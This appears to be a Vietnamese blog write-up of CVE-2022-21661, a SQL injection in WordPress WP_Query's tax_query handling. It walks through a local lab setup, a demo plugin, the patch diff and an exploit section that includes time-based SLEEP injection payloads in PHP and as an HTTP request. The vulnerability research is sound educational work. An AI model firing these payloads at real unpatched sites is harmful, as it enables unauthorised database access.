---
title: CVE-2022-21661 Analysis & POC
description: Security Vulnerability in WordPress Core.
date: 2025-10-01 12:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, sqli]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (**sanitization**) kh√¥ng ƒë√∫ng c√°ch trong `WP_Query`, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra **SQL Injection** th√¥ng qua c√°c **plugin** ho·∫∑c **theme** s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n **5.8.3**. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n **3.7.37**.

* **CVE ID**: [CVE-2022-21661](https://www.cve.org/CVERecord?id=CVE-2022-21661)
* **Product**: [WordPress](https://wordpress.org/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: `3.7.37 ‚â§ version < 5.8.3`
* **CVSS severity**:  High (8.0)

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **WordPress**: v5.8.2(vul)

## Setup

### Required PHP Version

WordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress:

* M·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi.
* N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© => s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c.
* Ng∆∞·ª£c l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y.

üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP **7.4** ƒë·ªÉ c√†i ƒë·∫∑t WordPress **5.8.2**.

### VSCode Extensions

WordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh **debug** v√† **truy v·∫øt**, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code:

* **PHP Extension Pack** => t√¨m b·∫±ng t·ª´ kh√≥a: `xdebug.php-pack`
* **PHP Tools** for VS Code => t√¨m b·∫±ng t·ª´ kh√≥a: `devsense.phptools-vscode`

### Custom Plugin

V√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn **WordPress Core**, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua **plugin** ho·∫∑c **theme** s·ª≠ d·ª•ng `WP_Query`, n√™n ta c·∫ßn th√¥ng qua m·ªôt **plugin** ho·∫∑c **theme** ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi **WP_Query**.

Ta x√¢y d·ª±ng **plugin** s·ª≠ d·ª•ng `WP_Query`, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua `WP_Query::request`.

```php
<?php
/**
 * Plugin Name: Demo WP_Query
 * Description: Plugin demo WP_Query
 * Version: 1.0
 * Author: w41bu1
 */

if (!defined('ABSPATH'))
    exit;

function da_show_posts()
{
    $args = [
        'post_type' => 'post',
        'tax_query' => [
            [
                'taxonomy' => 'category',
                'field' => 'term_taxonomy_id',
                'terms' => [1,2,3],
                'operator' => 'IN',
            ],
        ],
    ];

    $query = new WP_Query($args);

    ob_start();

    echo '<h3>Demo WP_Query</h3>';
    echo '<pre style="background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;">';
    echo "SQL query generated by WP_Query:\n\n";
    echo esc_html($query->request); // Display executed query 
    echo '</pre>';

    if ($query->have_posts()) {
        echo '<ul>';
        while ($query->have_posts()) {
            $query->the_post();
            echo '<li>' . get_the_title() . ' (' . get_the_ID() . ')</li>';
        }
        echo '</ul>';
    } else {
        echo '<p>No posts found.</p>';
    }

    wp_reset_postdata();
    return ob_get_clean();
}
add_shortcode('demo_wp_query', 'da_show_posts');
```

[Taxonomy parameters](https://developer.wordpress.org/reference/classes/wp_query/#taxonomy-parameters)

T·∫°o page m·ªõi v·ªõi `<page-title>` c√≥ **shortcode** :

```
[demo_wp_query]
```

üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p `http://localhost/<page-title>`

{{< figure src="demo_page.png" title="Trang demo hi·ªÉn th·ªã k·∫øt qu·∫£ WP_Query" >}}

## Analysis

**wpdb**

* L√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL.
* Cho ph√©p l·∫≠p tr√¨nh vi√™n **vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥**.

**WP_Query**

* L√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† **kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp**.
* L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p.

**M·ªëi quan h·ªá**

* WP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL.
* Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc **ki·ªÉm tra**/**validate**, r·ªìi g·ªçi `$wpdb` ƒë·ªÉ th·ª±c thi.

### Patch Diff

WordPress l√† m·ªôt d·ª± √°n **m√£ ngu·ªìn m·ªü** v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n **GitHub**. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn.

Trong ph·∫ßn reference c·ªßa **CVE-2022-21661**, c√≥ li√™n k·∫øt ƒë·∫øn [commit](https://github.com/WordPress/wordpress-develop/commit/17efac8c8ec64555eff5cf51a3eff81e06317214) tr√™n GitHub:

{{< figure src="patch_diff.png" title="So s√°nh b·∫£n v√° gi·ªØa hai phi√™n b·∫£n" >}}

L·ªó h·ªïng ƒë∆∞·ª£c v√° trong file **src/wp-includes/class-wp-tax-query.php**

**B·∫£n l·ªói**

```php
$query['terms'] = array_unique( (array) $query['terms'] );
```

* √âp `$query['terms']` th√†nh m·∫£ng v√† lo·∫°i b·ªè gi√° tr·ªã tr√πng l·∫∑p.
* Kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra ho·∫∑c √©p ki·ªÉu d·ªØ li·ªáu, d·∫´n ƒë·∫øn nguy c∆° ch√®n d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá v√†o truy v·∫•n SQL.

V√≠ d·ª•:

```php
$args = [
    'post_type' => 'post',
    'tax_query' => [
        [
            'taxonomy' => 'category',
            'field' => 'term_taxonomy_id',
            'terms' => ['1) AND (SELECT SLEEP(5)) # '],
            'operator' => 'IN',
        ],
    ],
];
```

**B·∫£n v√°**

```php
if ( 'slug' === $query['field'] || 'name' === $query['field'] ) {
    $query['terms'] = array_unique( (array) $query['terms'] );
} else {
    $query['terms'] = wp_parse_id_list( $query['terms'] );
}
```

* B·ªï sung ƒëi·ªÅu ki·ªán d·ª±a v√†o `$query['field']`:

  * N·∫øu l√† **slug** ho·∫∑c **name** => gi·ªØ nguy√™n c√°ch x·ª≠ l√Ω c≈©.
  * N·∫øu l√† **ID** => d√πng `wp_parse_id_list()` ƒë·ªÉ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n.

> Ta bi·∫øt ƒë√¢y l√† b∆∞·ªõc √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n b·ªüi v√¨ trong `tax_query`[^tax_query], tham s·ªë `field` ch·ªâ nh·∫≠n 4 gi√° tr·ªã: `slug`, `name`, `term_taxonomy_id` v√† `term_id`. Trong ƒë√≥, hai tr∆∞·ªùng `term_taxonomy_id` v√† `term_id` thu·ªôc b·∫£ng `wp_term_taxonomy` v√† ƒë·ªÅu c√≥ ki·ªÉu d·ªØ li·ªáu **BIGINT UNSIGNED**.

```sql
mysql> DESC wp_term_taxonomy;
+------------------+-----------------+------+-----+---------+----------------+
| Field            | Type            | Null | Key | Default | Extra          |
+------------------+-----------------+------+-----+---------+----------------+
| term_taxonomy_id | bigint unsigned | NO   | PRI | NULL    | auto_increment |
| term_id          | bigint unsigned | NO   | MUL | 0       |                |
| taxonomy         | varchar(32)     | NO   | MUL |         |                |
| description      | longtext        | NO   |     | NULL    |                |
| parent           | bigint unsigned | NO   |     | 0       |                |
| count            | bigint          | NO   |     | 0       |                |
+------------------+-----------------+------+-----+---------+----------------+
6 rows in set (0.01 sec)
```

### How it work?

{{< figure src="debug1.png" title="Breakpoint t·∫°i ƒë·∫ßu h√†m clean_query" >}}
{{< figure src="debug2.png" title="Ti·∫øp t·ª•c ƒë·∫øn query c√≥ taxonomy kh·ªõp" >}}
{{< figure src="debug3.png" title="Quan s√°t wp_list_pluck ghi ƒë√® terms" >}}
{{< figure src="debug4.png" title="Tr√°nh ghi ƒë√® terms b·∫±ng return s·ªõm" >}}
{{< figure src="debug5.png" title="Payload gi·ªØ nguy√™n trong truy v·∫•n th·ª±c thi" >}}

#### Flow

{{< figure src="callstack1.png" title="ƒê·ªëi t∆∞·ª£ng WP_Query ƒë∆∞·ª£c t·∫°o" >}}
{{< figure src="callstack2.png" title="H√†m __construct c·ªßa WP_Query ƒë∆∞·ª£c g·ªçi" >}}
{{< figure src="callstack3.png" title="G·ªçi get_posts ƒë·ªÉ th·ª±c thi query" >}}
{{< figure src="callstack4.png" title="ƒêi·ªÅu ki·ªán trong get_posts th·ªèa m√£n, g·ªçi get_sql" >}}
{{< figure src="callstack5.png" title="get_sql tr·∫£ v·ªÅ get_sql_clauses" >}}
{{< figure src="callstack6.png" title="get_sql_clauses g·ªçi get_sql_for_query" >}}
{{< figure src="callstack8.png" title="Duy·ªát m·∫£ng query trong get_sql_for_query" >}}
{{< figure src="callstack15.png" title="Ki·ªÉm tra keys terms, taxonomy, operator,..." >}}
{{< figure src="callstack7.png" title="G·ªçi get_sql_for_clause" >}}
{{< figure src="callstack9.png" title="Bypass clean_query gi·ªØ nguy√™n payload" >}}
{{< figure src="callstack10.png" title="Payload g√°n v√†o $sql['where']" >}}
{{< figure src="callstack11.png" title="Th√™m () v√†o m·ªánh ƒë·ªÅ WHERE" >}}
{{< figure src="callstack16.png" title="Th√™m AND v√† tr·∫£ v·ªÅ get_sql" >}}
{{< figure src="callstack14.png" title="get_posts nh·∫≠n gi√° tr·ªã t·ª´ get_sql" >}}
{{< figure src="callstack12.png" title="Payload th√™m v√†o $clauses['where']" >}}
{{< figure src="callstack13.png" title="Quan s√°t last_query t·∫°i n∆°i th·ª±c thi SQL" >}}

**Chart minh h·ªça lu·ªìng th·ª±c thi**

{{< figure src="chart.png" title="Bi·ªÉu ƒë·ªì lu·ªìng th·ª±c thi c·ªßa WP_Query d·∫´n ƒë·∫øn SQLi" >}}

## Exploit

Thay gi√° tr·ªã c·ªßa `terms` b·∫±ng payload SQLi:

```http
GET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1
```

{{< figure src="detect.png" title="K·∫øt qu·∫£ ph·∫£n h·ªìi cho th·∫•y truy v·∫•n ch·∫≠m do payload ho·∫°t ƒë·ªông" >}}

## Conclusion

L·ªó h·ªïng **CVE-2022-21661** trong **WordPress Core** tr∆∞·ªõc phi√™n b·∫£n **5.8.3**, quay ng∆∞·ª£c ƒë·∫øn t·∫≠n phi√™n b·∫£n **3.7.37**, xu·∫•t ph√°t t·ª´ vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (**sanitization**) kh√¥ng ƒë√∫ng c√°ch trong `WP_Query` d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[CVE-2022-21661 Detail](https://www.cve.org/CVERecord?id=CVE-2022-21661)

## Notes

[^tax_query]: V√¨ patch n·∫±m trong file **src/wp-includes/class-wp-tax-query.php**, file n√†y ƒë·ªãnh nghƒ©a class `WP_Tax_Query`, ch·ªãu tr√°ch nhi·ªám x·ª≠ l√Ω tham s·ªë `tax_query` trong `WP_Query`. N·∫øu c√≥ thay ƒë·ªïi trong file n√†y th√¨ g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn n√≥ li√™n quan ƒë·∫øn qu√° tr√¨nh **parse/validate** c·ªßa `tax_query`.
